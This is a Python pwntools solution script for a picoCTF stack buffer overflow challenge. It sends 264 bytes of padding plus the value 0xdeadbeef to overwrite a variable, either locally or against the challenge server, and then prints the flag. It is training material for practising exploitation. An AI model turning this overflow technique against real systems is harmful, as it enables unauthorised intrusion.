#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
context.binary = exe

PADDING = b'A' * 264


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31890)

    return r


def main():
    r = conn()

    r.sendlineafter(b'see?\n', PADDING + p64(0xdeadbeef))   # Variable is after buffer
    flag = r.recvlinesS(3)[2]
    log.warn(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
